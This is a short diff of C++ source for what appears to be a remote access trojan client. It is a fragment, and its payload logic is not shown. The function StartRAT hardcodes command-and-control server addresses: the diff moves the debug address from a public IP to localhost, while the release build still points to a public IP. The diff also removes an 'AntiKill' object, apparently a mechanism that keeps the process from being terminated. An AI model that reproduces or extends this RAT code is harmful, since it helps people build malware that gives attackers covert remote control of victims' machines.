@@ -80,7 +80,7 @@ class App{
 public:
 	static void StartRAT(){
 #ifdef _DEBUG
-		char szServerAddr[32] = "81.68.224.152";
+		char szServerAddr[32] = "127.0.0.1";
 #else
 		char szServerAddr[32] = "49.235.129.40";
 #endif
@@ -172,7 +172,7 @@ void Launch(){
 	App theApp;
 }
 
-AntiKill antiKill;
+
 int main(){
 	CIOCPClient::SocketInit();
 	App::StartRAT();
